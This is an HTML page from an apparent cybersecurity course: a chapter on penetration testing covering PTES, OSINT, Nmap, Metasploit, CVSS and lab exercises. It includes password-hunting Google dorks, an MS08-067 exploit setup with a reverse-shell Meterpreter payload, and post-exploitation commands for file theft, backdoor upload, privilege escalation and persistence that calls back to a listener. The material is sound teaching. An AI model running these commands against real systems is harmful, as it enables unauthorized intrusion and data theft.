+    <span class="md-ellipsis">
+      Key Takeaways
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#review-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Review Questions
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#further-reading" class="md-nav__link">
+    <span class="md-ellipsis">
+      Further Reading
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Chapter09 penetration testing</h1>
+
+<p>chapter09-penetration-testing.md
+Chapter 9: Asset Security &amp; Penetration Testing
+===============================================</p>
+<h2 id="learning-objectives">Learning Objectives</h2>
+<p>By the end of this chapter, you will be able to:</p>
+<ul>
+<li>Understand the fundamentals of asset security and penetration testing</li>
+<li>Follow the complete penetration testing lifecycle from planning to reporting</li>
+<li>Use Nmap for network scanning and reconnaissance</li>
+<li>Conduct OSINT (Open Source Intelligence) gathering</li>
+<li>Utilize Metasploit for exploitation and post-exploitation</li>
+<li>Perform web and wireless exploitation techniques</li>
+<li>Apply PTES (Penetration Testing Execution Standard) methodology</li>
+<li>Use CVSS scoring for vulnerability assessment</li>
+<li>Create professional penetration testing reports</li>
+</ul>
+<h2 id="introduction">Introduction</h2>
+<p>Asset security and penetration testing represent the offensive side of cybersecurity - testing your defenses through ethical hacking to identify vulnerabilities before malicious actors can exploit them. This chapter covers the complete penetration testing methodology, from initial planning to final reporting, providing hands-on experience with industry-standard tools and frameworks.</p>
+<h2 id="what-is-asset-security">What is Asset Security?</h2>
+<p>Asset security involves protecting an organization's valuable information and systems from unauthorized access, use, disclosure, disruption, modification, or destruction. Penetration testing is a proactive approach to asset security that simulates real-world attacks to identify and remediate vulnerabilities.</p>
+<h3 id="key-concepts">Key Concepts</h3>
+<ul>
+<li><strong>Asset</strong>: Any data, device, or system that has value to an organization</li>
+<li><strong>Vulnerability</strong>: A weakness that could be exploited by a threat</li>
+<li><strong>Threat</strong>: Any circumstance or event that could harm an asset</li>
+<li><strong>Risk</strong>: The likelihood that a threat will exploit a vulnerability</li>
+<li>
+<p><strong>Penetration Testing</strong>: Authorized simulated attacks to test security controls</p>
+<p>graph TD
+    A[Asset Identification] --&gt; B[Vulnerability Assessment]
+    B --&gt; C[Threat Analysis]
+    C --&gt; D[Risk Evaluation]
+    D --&gt; E[Security Controls]
+    E --&gt; F[Penetration Testing]
+    F --&gt; G[Remediation]
+    G --&gt; H[Continuous Monitoring]</p>
+<div class="highlight"><pre><span></span><code>style A fill:#e1f5fe
+style F fill:#ffebee
+style G fill:#e8f5e8
+</code></pre></div>
+</li>
+</ul>
+<h2 id="penetration-testing-methodology">Penetration Testing Methodology</h2>
+<h3 id="the-penetration-testing-lifecycle">The Penetration Testing Lifecycle</h3>
+<p>Penetration testing follows a structured approach to ensure comprehensive coverage and ethical conduct:</p>
+<div class="highlight"><pre><span></span><code>graph LR
+    A[Planning &amp; Preparation] --&gt; B[Reconnaissance]
+    B --&gt; C[Scanning &amp; Enumeration]
+    C --&gt; D[Gaining Access]
+    D --&gt; E[Maintaining Access]
+    E --&gt; F[Analysis &amp; Reporting]
+
+    style A fill:#e3f2fd
+    style B fill:#f3e5f5
+    style C fill:#e8f5e8
+    style D fill:#fff3e0
+    style E fill:#fce4ec
+    style F fill:#f1f8e9
+</code></pre></div>
+<h4 id="1-planning-preparation">1. Planning &amp; Preparation</h4>
+<ul>
+<li>Define scope and objectives</li>
+<li>Obtain proper authorization</li>
+<li>Establish rules of engagement</li>
+<li>Set up testing environment</li>
+<li>Prepare tools and resources</li>
+</ul>
+<h4 id="2-reconnaissance-osint">2. Reconnaissance (OSINT)</h4>
+<ul>
+<li>Passive information gathering</li>
+<li>Active information gathering</li>
+<li>Social engineering reconnaissance</li>
+<li>Technical reconnaissance</li>
+</ul>
+<h4 id="3-scanning-enumeration">3. Scanning &amp; Enumeration</h4>
+<ul>
+<li>Network scanning</li>
+<li>Port scanning</li>
+<li>Service enumeration</li>
+<li>Vulnerability scanning</li>
+</ul>
+<h4 id="4-gaining-access">4. Gaining Access</h4>
+<ul>
+<li>Exploitation of vulnerabilities</li>
+<li>Privilege escalation</li>
+<li>Web application attacks</li>
+<li>Wireless network attacks</li>
+</ul>
+<h4 id="5-maintaining-access">5. Maintaining Access</h4>
+<ul>
+<li>Backdoor installation</li>
+<li>Persistence mechanisms</li>
+<li>Data exfiltration</li>
+<li>Lateral movement</li>
+</ul>
+<h4 id="6-analysis-reporting">6. Analysis &amp; Reporting</h4>
+<ul>
+<li>Evidence collection</li>
+<li>Vulnerability documentation</li>
+<li>Risk assessment</li>
+<li>Remediation recommendations</li>
+</ul>
+<h2 id="osint-open-source-intelligence">OSINT (Open Source Intelligence)</h2>
+<p>OSINT is the collection and analysis of publicly available information to gather intelligence about a target organization or individual.</p>
+<h3 id="osint-process">OSINT Process</h3>
+<div class="highlight"><pre><span></span><code>graph TD
+    A[Target Identification] --&gt; B[Information Sources]
+    B --&gt; C[Data Collection]
+    C --&gt; D[Data Analysis]
+    D --&gt; E[Intelligence Production]
+    E --&gt; F[Actionable Insights]
+
+    style A fill:#e8f5e8
+    style C fill:#fff3e0
+    style E fill:#e1f5fe
+</code></pre></div>
+<h3 id="osint-sources">OSINT Sources</h3>
+<h4 id="public-sources">Public Sources</h4>
+<ul>
+<li><strong>Company Websites</strong>: Corporate information, employee details, technology stack</li>
+<li><strong>Social Media</strong>: LinkedIn, Twitter, Facebook for employee information</li>
+<li><strong>Job Postings</strong>: Technology stack, infrastructure details</li>
+<li><strong>Public Records</strong>: Business registrations, patents, legal documents</li>
+<li><strong>News Articles</strong>: Company developments, partnerships, acquisitions</li>
+</ul>
+<h4 id="technical-sources">Technical Sources</h4>
+<ul>
+<li><strong>DNS Records</strong>: Domain information, subdomains, mail servers</li>
+<li><strong>WHOIS Data</strong>: Domain ownership, contact information</li>
+<li><strong>Search Engines</strong>: Google dorks, specialized search operators</li>
+<li><strong>GitHub</strong>: Code repositories, configuration files</li>
+<li><strong>Shodan</strong>: Internet-connected devices and services</li>
+</ul>
+<h3 id="osint-tools">OSINT Tools</h3>
+<div class="highlight"><pre><span></span><code># DNS enumeration
+nslookup target.com
+dig target.com ANY
+whois target.com
+
+# Subdomain discovery
+gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
+
+# Google dorks
+site:target.com filetype:pdf
+site:target.com &quot;password&quot;
+site:target.com &quot;admin&quot;
+</code></pre></div>
+<h2 id="network-scanning-with-nmap">Network Scanning with Nmap</h2>
+<p>Nmap (Network Mapper) is a powerful network discovery and security auditing tool that provides comprehensive network scanning capabilities.</p>
+<h3 id="nmap-scan-types">Nmap Scan Types</h3>
+<div class="highlight"><pre><span></span><code>graph LR
+    A[Nmap] --&gt; B[TCP Connect Scan]
+    A --&gt; C[SYN Scan]
+    A --&gt; D[UDP Scan]
+    A --&gt; E[Version Detection]
+    A --&gt; F[OS Detection]
+    A --&gt; G[Script Scanning]
+
+    style A fill:#ffebee
+    style B fill:#e8f5e8
+    style C fill:#fff3e0
+    style D fill:#f3e5f5
+</code></pre></div>
+<h4 id="1-tcp-connect-scan-st">1. TCP Connect Scan (-sT)</h4>
+<ul>
+<li>Completes the TCP three-way handshake</li>
+<li>More reliable but easily detected</li>
+<li>
+<p>Requires full TCP connection</p>
+<p>nmap -sT -p 80,443,22,21 target.com</p>
+</li>
+</ul>
+<h4 id="2-syn-scan-ss">2. SYN Scan (-sS)</h4>
+<ul>
+<li>Stealthy scan that doesn't complete connections</li>
+<li>Faster and less detectable</li>
+<li>
+<p>Requires root/administrator privileges</p>
+<p>sudo nmap -sS -p 1-1000 target.com</p>
+</li>
+</ul>
+<h4 id="3-udp-scan-su">3. UDP Scan (-sU)</h4>
+<ul>
+<li>Scans UDP ports for open services</li>
+<li>Slower than TCP scans</li>
+<li>
+<p>Useful for discovering DNS, DHCP, SNMP services</p>
+<p>nmap -sU -p 53,67,161 target.com</p>
+</li>
+</ul>
+<h4 id="4-version-detection-sv">4. Version Detection (-sV)</h4>
+<ul>
+<li>Identifies service versions and details</li>
+<li>Helps identify vulnerable software versions</li>
+<li>
+<p>Useful for vulnerability assessment</p>
+<p>nmap -sV -p 80,443,22 target.com</p>
+</li>
+</ul>
+<h4 id="5-os-detection-o">5. OS Detection (-O)</h4>
+<ul>
+<li>Attempts to identify target operating system</li>
+<li>Requires root/administrator privileges</li>
+<li>
+<p>Uses TCP/IP stack fingerprinting</p>
+<p>sudo nmap -O target.com</p>
+</li>
+</ul>
+<h3 id="advanced-nmap-techniques">Advanced Nmap Techniques</h3>
+<h4 id="port-range-specification">Port Range Specification</h4>
+<div class="highlight"><pre><span></span><code># Scan specific ports
+nmap -p 22,80,443 target.com
+
+# Scan port ranges
+nmap -p 1-1000 target.com
+
+# Scan all ports
+nmap -p- target.com
+</code></pre></div>
+<h4 id="timing-and-performance">Timing and Performance</h4>
+<div class="highlight"><pre><span></span><code># Aggressive timing
+nmap -T4 target.com
+
+# Paranoid timing (very slow, very stealthy)
+nmap -T0 target.com
+
+# Custom timing
+nmap --max-retries 1 --max-scan-delay 10ms target.com
+</code></pre></div>
+<h4 id="output-formats">Output Formats</h4>
+<div class="highlight"><pre><span></span><code># Normal output
+nmap target.com
+
+# XML output
+nmap -oX scan_results.xml target.com
+
+# Grepable output
+nmap -oG scan_results.gnmap target.com
+
+# All formats
+nmap -oA scan_results target.com
+</code></pre></div>
+<h2 id="metasploit-framework">Metasploit Framework</h2>
+<p>Metasploit is a powerful penetration testing platform that provides tools for developing, testing, and executing exploit code against target systems.</p>
+<h3 id="metasploit-architecture">Metasploit Architecture</h3>
+<div class="highlight"><pre><span></span><code>graph TD
+    A[Metasploit Framework] --&gt; B[Modules]
+    B --&gt; C[Exploits]
+    B --&gt; D[Payloads]
+    B --&gt; E[Auxiliary]
+    B --&gt; F[Post]
+    B --&gt; G[Encoders]
+
+    C --&gt; H[Remote Exploits]
+    C --&gt; I[Local Exploits]
+    C --&gt; J[Client-Side Exploits]
+
+    D --&gt; K[Single Payloads]
+    D --&gt; L[Staged Payloads]
+    D --&gt; M[Meterpreter]
+
+    style A fill:#ffebee
+    style B fill:#e8f5e8
+    style C fill:#fff3e0
+    style D fill:#f3e5f5
+</code></pre></div>
+<h3 id="metasploit-components">Metasploit Components</h3>
+<h4 id="1-exploits">1. Exploits</h4>
+<ul>
+<li><strong>Remote Exploits</strong>: Target services over the network</li>
+<li><strong>Local Exploits</strong>: Require local access to the target</li>
+<li><strong>Client-Side Exploits</strong>: Target client applications</li>
+</ul>
+<h4 id="2-payloads">2. Payloads</h4>
+<ul>
+<li><strong>Single Payloads</strong>: Complete, self-contained code</li>
+<li><strong>Staged Payloads</strong>: Download and execute in stages</li>
+<li><strong>Meterpreter</strong>: Advanced, feature-rich payload</li>
+</ul>
+<h4 id="3-auxiliary-modules">3. Auxiliary Modules</h4>
+<ul>
+<li><strong>Scanners</strong>: Port scanning, service detection</li>
+<li><strong>Fuzzers</strong>: Input validation testing</li>
+<li><strong>Gatherers</strong>: Information collection</li>
+</ul>
+<h3 id="basic-metasploit-usage">Basic Metasploit Usage</h3>
+<h4 id="starting-metasploit">Starting Metasploit</h4>
+<div class="highlight"><pre><span></span><code># Start Metasploit console
+msfconsole
+
+# Start with database
+msfdb init
+msfconsole
+</code></pre></div>
+<h4 id="searching-for-modules">Searching for Modules</h4>
+<div class="highlight"><pre><span></span><code># Search for exploits
+search exploit windows smb
+
+# Search for auxiliary modules
+search auxiliary scanner
+
+# Search by platform
+search platform:windows
+</code></pre></div>
+<h4 id="using-exploits">Using Exploits</h4>
+<div class="highlight"><pre><span></span><code># Select an exploit
+use exploit/windows/smb/ms08_067_netapi
+
+# Show options
+show options
+
+# Set required options
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+
+# Execute exploit
+exploit
+</code></pre></div>
+<h4 id="post-exploitation-with-meterpreter">Post-Exploitation with Meterpreter</h4>
+<div class="highlight"><pre><span></span><code># System information
+sysinfo
+
+# Process list
+ps
+
+# File operations
+ls
+cd C:\\
+download secret.txt
+upload backdoor.exe
+
+# Privilege escalation
+getsystem
+
+# Persistence
+run persistence -X -i 30 -p 4444 -r 192.168.1.10
+</code></pre></div>
+<h2 id="web-and-wireless-exploitation">Web and Wireless Exploitation</h2>
+<h3 id="web-application-exploitation">Web Application Exploitation</h3>
+<p>Web applications present numerous attack vectors that penetration testers must understand and test:</p>
+<div class="highlight"><pre><span></span><code>graph TD
+    A[Web Application] --&gt; B[Input Validation]
+    A --&gt; C[Authentication]
+    A --&gt; D[Session Management]
+    A --&gt; E[Access Control]
+    A --&gt; F[Data Storage]
+
+    B --&gt; G[SQL Injection]
+    B --&gt; H[XSS]
+    B --&gt; I[CSRF]
+
+    C --&gt; J[Weak Passwords]
+    C --&gt; K[Brute Force]
+    C --&gt; L[Session Hijacking]
+
+    style A fill:#e8f5e8
+    style G fill:#ffebee
+    style H fill:#fff3e0
+    style I fill:#f3e5f5
+</code></pre></div>
+<h4 id="common-web-vulnerabilities">Common Web Vulnerabilities</h4>
+<ol>
+<li>
+<p><strong>SQL Injection</strong></p>
+<ul>
+<li>Unauthorized database access</li>
+<li>Data extraction and manipulation</li>
+<li>Authentication bypass</li>
+<li>
+<p><strong>Cross-Site Scripting (XSS)</strong></p>
+</li>
+<li>
+<p>Client-side code execution</p>
+</li>
+<li>Session hijacking</li>
+<li>Malicious redirects</li>
+<li>
+<p><strong>Cross-Site Request Forgery (CSRF)</strong></p>
+</li>
+<li>
+<p>Unauthorized actions on behalf of users</p>
+</li>
+<li>Account takeover</li>
+<li>Data manipulation</li>
+</ul>
+</li>
+</ol>
+<h3 id="wireless-network-exploitation">Wireless Network Exploitation</h3>
+<p>Wireless networks introduce additional attack vectors:</p>
+<div class="highlight"><pre><span></span><code>graph LR
+    A[Wireless Network] --&gt; B[WEP]
+    A --&gt; C[WPA/WPA2]
+    A --&gt; D[WPA3]
+    A --&gt; E[Enterprise]
+
+    B --&gt; F[Weak Encryption]
+    C --&gt; G[Dictionary Attacks]
+    D --&gt; H[Modern Security]
+    E --&gt; I[Certificate Attacks]
+
+    style A fill:#e8f5e8
+    style F fill:#ffebee
+    style G fill:#fff3e0
+</code></pre></div>
+<h4 id="wireless-attack-types">Wireless Attack Types</h4>
+<ol>
+<li>
+<p><strong>WEP Attacks</strong></p>
+<ul>
+<li>Weak encryption algorithm</li>
+<li>IV reuse vulnerabilities</li>
+<li>Statistical attacks</li>
+<li>
+<p><strong>WPA/WPA2 Attacks</strong></p>
+</li>
+<li>
+<p>Dictionary attacks on pre-shared keys</p>
+</li>
+<li>WPS PIN attacks</li>
+<li>Deauthentication attacks</li>
+<li>
+<p><strong>Enterprise Attacks</strong></p>
+</li>
+<li>
+<p>Certificate-based attacks</p>
+</li>
+<li>RADIUS vulnerabilities</li>
+<li>Man-in-the-middle attacks</li>
+</ul>
+</li>
+</ol>
+<h2 id="ptes-penetration-testing-execution-standard">PTES (Penetration Testing Execution Standard)</h2>
+<p>PTES provides a comprehensive methodology for conducting penetration tests:</p>
+<h3 id="ptes-phases">PTES Phases</h3>
+<div class="highlight"><pre><span></span><code>graph TD
+    A[Pre-engagement] --&gt; B[Intelligence Gathering]
+    B --&gt; C[Threat Modeling]
+    C --&gt; D[Vulnerability Analysis]
+    D --&gt; E[Exploitation]
+    E --&gt; F[Post Exploitation]
+    F --&gt; G[Reporting]
+
+    style A fill:#e3f2fd
+    style B fill:#f3e5f5
+    style C fill:#e8f5e8
+    style D fill:#fff3e0
+    style E fill:#fce4ec
+    style F fill:#f1f8e9
+    style G fill:#e8f5e8
+</code></pre></div>
+<h4 id="1-pre-engagement">1. Pre-engagement</h4>
+<ul>
+<li>Define scope and objectives</li>
+<li>Establish rules of engagement</li>
+<li>Obtain proper authorization</li>
+<li>Set up communication channels</li>
+</ul>
+<h4 id="2-intelligence-gathering">2. Intelligence Gathering</h4>
+<ul>
+<li>Passive reconnaissance</li>
+<li>Active reconnaissance</li>
+<li>Social engineering</li>
+<li>Technical reconnaissance</li>
+</ul>
+<h4 id="3-threat-modeling">3. Threat Modeling</h4>
+<ul>
+<li>Identify potential threats</li>
+<li>Assess threat capabilities</li>
+<li>Determine attack vectors</li>
+<li>Prioritize threats</li>
+</ul>
+<h4 id="4-vulnerability-analysis">4. Vulnerability Analysis</h4>
+<ul>
+<li>Automated scanning</li>
+<li>Manual testing</li>
+<li>Configuration review</li>
+<li>Code review</li>
+</ul>
+<h4 id="5-exploitation">5. Exploitation</h4>
+<ul>
+<li>Vulnerability exploitation</li>
+<li>Privilege escalation</li>
+<li>Lateral movement</li>
+<li>Data access</li>
+</ul>
+<h4 id="6-post-exploitation">6. Post Exploitation</h4>
+<ul>
+<li>Persistence establishment</li>
+<li>Data exfiltration</li>
+<li>Evidence collection</li>
+<li>Cleanup</li>
+</ul>
+<h4 id="7-reporting">7. Reporting</h4>
+<ul>
+<li>Executive summary</li>
+<li>Technical details</li>
+<li>Risk assessment</li>
+<li>Remediation recommendations</li>
+</ul>
+<h2 id="cvss-scoring">CVSS Scoring</h2>
+<p>The Common Vulnerability Scoring System (CVSS) provides a standardized method for rating the severity of security vulnerabilities.</p>
+<h3 id="cvss-components">CVSS Components</h3>
+<div class="highlight"><pre><span></span><code>graph TD
+    A[CVSS Score] --&gt; B[Base Score]
+    A --&gt; C[Temporal Score]
+    A --&gt; D[Environmental Score]
+
+    B --&gt; E[Attack Vector]
+    B --&gt; F[Attack Complexity]
+    B --&gt; G[Privileges Required]
+    B --&gt; H[User Interaction]
+    B --&gt; I[Scope]
+    B --&gt; J[Confidentiality]
+    B --&gt; K[Integrity]
+    B --&gt; L[Availability]
+
+    style A fill:#ffebee
+    style B fill:#e8f5e8
+    style C fill:#fff3e0
+    style D fill:#f3e5f5
+</code></pre></div>
+<h3 id="cvss-base-score-calculation">CVSS Base Score Calculation</h3>
+<h4 id="attack-vector-av">Attack Vector (AV)</h4>
+<ul>
+<li><strong>Network (N)</strong>: 0.85</li>
+<li><strong>Adjacent (A)</strong>: 0.62</li>
+<li><strong>Local (L)</strong>: 0.55</li>
+<li><strong>Physical (P)</strong>: 0.2</li>
+</ul>
+<h4 id="attack-complexity-ac">Attack Complexity (AC)</h4>
+<ul>
+<li><strong>Low (L)</strong>: 0.77</li>
+<li><strong>High (H)</strong>: 0.44</li>
+</ul>
+<h4 id="privileges-required-pr">Privileges Required (PR)</h4>
+<ul>
+<li><strong>None (N)</strong>: 0.85</li>
+<li><strong>Low (L)</strong>: 0.62</li>
+<li><strong>High (H)</strong>: 0.27</li>
+</ul>
+<h4 id="user-interaction-ui">User Interaction (UI)</h4>
+<ul>
+<li><strong>None (N)</strong>: 0.85</li>
+<li><strong>Required (R)</strong>: 0.62</li>
+</ul>
+<h4 id="scope-s">Scope (S)</h4>
+<ul>
+<li><strong>Unchanged (U)</strong>: 6.42</li>
+<li><strong>Changed (C)</strong>: 7.52</li>
+</ul>
+<h4 id="impact-metrics">Impact Metrics</h4>
+<ul>
+<li><strong>Confidentiality (C)</strong>: None (0), Low (0.22), High (0.56)</li>
+<li><strong>Integrity (I)</strong>: None (0), Low (0.22), High (0.56)</li>
+<li><strong>Availability (A)</strong>: None (0), Low (0.22), High (0.56)</li>
+</ul>
+<h3 id="cvss-score-ranges">CVSS Score Ranges</h3>
+<ul>
+<li><strong>0.1 - 3.9</strong>: Low</li>
+<li><strong>4.0 - 6.9</strong>: Medium</li>
+<li><strong>7.0 - 8.9</strong>: High</li>
+<li><strong>9.0 - 10.0</strong>: Critical</li>
+</ul>
+<h3 id="example-cvss-calculation">Example CVSS Calculation</h3>
+<div class="highlight"><pre><span></span><code># Example: SQL Injection vulnerability
+# AV: Network (0.85)
+# AC: Low (0.77)
+# PR: None (0.85)
+# UI: None (0.85)
+# S: Unchanged (6.42)
+# C: High (0.56)
+# I: High (0.56)
+# A: High (0.56)
+
+# Base Score = 9.8 (Critical)
+</code></pre></div>
+<h2 id="hands-on-activities">Hands-On Activities</h2>
+<h3 id="activity-1-osint-reconnaissance">Activity 1: OSINT Reconnaissance</h3>
+<p><strong>Objective</strong>: Conduct comprehensive OSINT gathering on a target organization</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Identify target organization</li>
+<li>Gather domain information using WHOIS and DNS tools</li>
+<li>Discover subdomains using various techniques</li>
+<li>Search for publicly available information</li>
+<li>Document findings in a structured format</li>
+</ol>
+<p><strong>Tools</strong>:</p>
+<ul>
+<li><code>whois</code>, <code>dig</code>, <code>nslookup</code></li>
+<li><code>gobuster</code>, <code>subfinder</code></li>
+<li>Google dorks</li>
+<li>Social media platforms</li>
+</ul>
+<h3 id="activity-2-network-scanning-with-nmap">Activity 2: Network Scanning with Nmap</h3>
+<p><strong>Objective</strong>: Perform comprehensive network reconnaissance using Nmap</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Set up target environment (virtual machines)</li>
+<li>Perform different types of Nmap scans</li>
+<li>Analyze scan results</li>
+<li>Identify open services and potential vulnerabilities</li>
+<li>Document findings and recommendations</li>
+</ol>
+<p><strong>Scans to Perform</strong>:</p>
+<ul>
+<li>TCP connect scan</li>
+<li>SYN scan</li>
+<li>UDP scan</li>
+<li>Version detection</li>
+<li>OS detection</li>
+</ul>
+<h3 id="activity-3-metasploit-exploitation">Activity 3: Metasploit Exploitation</h3>
+<p><strong>Objective</strong>: Use Metasploit to exploit vulnerabilities and gain access</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Set up vulnerable target system</li>
+<li>Identify target vulnerabilities</li>
+<li>Select appropriate Metasploit modules</li>
+<li>Configure and execute exploits</li>
+<li>Perform post-exploitation activities</li>
+<li>Document the entire process</li>
+</ol>
+<p><strong>Exploits to Practice</strong>:</p>
+<ul>
+<li>Windows SMB vulnerabilities</li>
+<li>Web application vulnerabilities</li>
+<li>Service-specific exploits</li>
+</ul>
+<h3 id="activity-4-web-application-penetration-testing">Activity 4: Web Application Penetration Testing</h3>
+<p><strong>Objective</strong>: Identify and exploit web application vulnerabilities</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Set up vulnerable web application (DVWA, WebGoat)</li>
+<li>Perform manual vulnerability assessment</li>
+<li>Test for common vulnerabilities (SQL injection, XSS, CSRF)</li>
+<li>Document vulnerabilities with proof of concept</li>
+<li>Provide remediation recommendations</li>
+</ol>
+<p><strong>Vulnerabilities to Test</strong>:</p>
+<ul>
+<li>Input validation flaws</li>
+<li>Authentication bypass</li>
+<li>Session management issues</li>
+<li>Access control problems</li>
+</ul>
+<h3 id="activity-5-penetration-test-report">Activity 5: Penetration Test Report</h3>
+<p><strong>Objective</strong>: Create a comprehensive penetration testing report</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Compile all findings from previous activities</li>
+<li>Structure report according to industry standards</li>
+<li>Include executive summary and technical details</li>
+<li>Provide risk assessments and CVSS scores</li>
+<li>Recommend remediation strategies</li>
+<li>Present findings professionally</li>
+</ol>
+<p><strong>Report Sections</strong>:</p>
+<ul>
+<li>Executive summary</li>
+<li>Methodology</li>
+<li>Findings and evidence</li>
+<li>Risk assessment</li>
+<li>Remediation recommendations</li>
+<li>Appendices</li>
+</ul>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li><strong>Penetration testing</strong> is a systematic approach to testing security controls through ethical hacking</li>
+<li><strong>OSINT</strong> provides valuable information about targets through publicly available sources</li>
+<li><strong>Nmap</strong> is essential for network reconnaissance and service enumeration</li>
+<li><strong>Metasploit</strong> offers powerful exploitation and post-exploitation capabilities</li>
+<li><strong>PTES</strong> provides a comprehensive methodology for conducting penetration tests</li>
+<li><strong>CVSS scoring</strong> standardizes vulnerability severity assessment</li>
+<li><strong>Ethical conduct</strong> is paramount in all penetration testing activities</li>
+<li><strong>Documentation</strong> is crucial for effective reporting and remediation</li>
+</ol>
+<h2 id="review-questions">Review Questions</h2>
+<ol>
+<li>What are the six phases of the penetration testing lifecycle?</li>
+<li>How does OSINT differ from active reconnaissance?</li>
+<li>What are the advantages of SYN scanning over TCP connect scanning?</li>
+<li>Explain the difference between exploits and payloads in Metasploit</li>
+<li>What are the main components of CVSS scoring?</li>
+<li>Why is proper authorization essential in penetration testing?</li>
+<li>How can web application vulnerabilities be categorized?</li>
+<li>What role does threat modeling play in penetration testing?</li>
+</ol>
+<h2 id="further-reading">Further Reading</h2>
+<ul>
+<li>
+<p><strong>Books</strong>:</p>
+<ul>
+<li>"The Web Application Hacker's Handbook" by Dafydd Stuttard and Marcus Pinto</li>
+<li>"Metasploit: The Penetration Tester's Guide" by David Kennedy et al.</li>
+<li>"Nmap Network Scanning" by Gordon Lyon</li>
+<li>
+<p><strong>Standards and Frameworks</strong>:</p>
+</li>
+<li>
+<p>PTES (Penetration Testing Execution Standard)</p>
+</li>
+<li>OWASP Testing Guide</li>
+<li>NIST Cybersecurity Framework</li>
+<li>
+<p><strong>Tools and Resources</strong>:</p>
+</li>
+<li>
+<p>Metasploit Framework documentation</p>
+</li>
+<li>Nmap reference guide</li>
+<li>CVSS calculator and documentation</li>
+<li>
+<p><strong>Certifications</strong>:</p>
+</li>
+<li>
+<p>CEH (Certified Ethical Hacker)</p>
+</li>
+<li>OSCP (Offensive Security Certified Professional)</li>
+<li>GPEN (GIAC Penetration Tester)</li>
+</ul>
+</li>
+</ul>
+<hr />
+<p><strong>Previous Chapter</strong>: <a href="../chapter08-cryptography/">Chapter 8: Cryptography Fundamentals</a> - Learn about encryption algorithms, cryptographic protocols, and Public Key Infrastructure (PKI).</p>
+<p><strong>Next Chapter</strong>: <a href="../chapter10-application-security/">Chapter 10: Application Security</a> - Learn about secure software development, OWASP Top 10, and application security testing methodologies.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      © 2026 Data Octo · Enterprise Cloud, Data & AI, Cybersecurity Architecture
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tracking", "navigation.sections", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="https://unpkg.com/mermaid@10/dist/mermaid.min.js"></script>
+      
+        <script src="../../../assets/javascripts/mermaid-init.js"></script>
+      
+    
+  </body>
+</html>
